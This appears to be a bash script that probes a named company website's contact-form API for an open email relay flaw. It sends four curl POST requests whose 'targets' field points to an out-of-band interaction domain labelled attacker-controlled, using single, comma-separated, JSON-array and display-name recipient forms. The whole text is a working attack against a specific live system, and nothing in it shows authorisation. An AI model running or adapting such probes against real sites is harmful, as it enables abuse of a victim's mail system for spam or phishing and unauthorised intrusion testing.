#!/bin/bash
H="https://www.infinitycapital.bh"
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36'
R=oobrelay1.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
echo "### R1: send to a NON-company recipient (attacker-controlled domain)"
curl -s -A "$UA" -X POST "$H/api/send" --max-time 25 \
 -F 'fname=Attacker' -F 'lname=Test' -F 'areacode=973' -F 'tel=3000000' -F 'cname=Attacker' \
 -F 'subject=ICRELAY9' -F 'msg=relay test ICMARKER9' -F 'check=true' -F "targets=$R" | head -c 300; echo
echo "### R2: multiple comma-separated recipients"
curl -s -A "$UA" -X POST "$H/api/send" --max-time 25 \
 -F 'fname=Attacker' -F 'lname=Test' -F 'areacode=973' -F 'tel=3000000' -F 'cname=Attacker' \
 -F 'subject=ICRELAY9' -F 'msg=relay test 2' -F 'check=true' -F "targets=info@infinitycapital.bh,$R" | head -c 300; echo
echo "### R3: JSON array form of targets (as the SPA sends it)"
curl -s -A "$UA" -X POST "$H/api/send" --max-time 25 \
 -F 'fname=Attacker' -F 'lname=Test' -F 'areacode=973' -F 'tel=3000000' -F 'cname=Attacker' \
 -F 'subject=ICRELAY9' -F 'msg=relay test 3' -F 'check=true' -F "targets=[\"$R\"]" | head -c 300; echo
echo "### R4: Name <email> display-name form"
curl -s -A "$UA" -X POST "$H/api/send" --max-time 25 \
 -F 'fname=Attacker' -F 'lname=Test' -F 'areacode=973' -F 'tel=3000000' -F 'cname=Attacker' \
 -F 'subject=ICRELAY9' -F 'msg=relay test 4' -F 'check=true' -F "targets=Tester <$R>" | head -c 300; echo
echo DONE
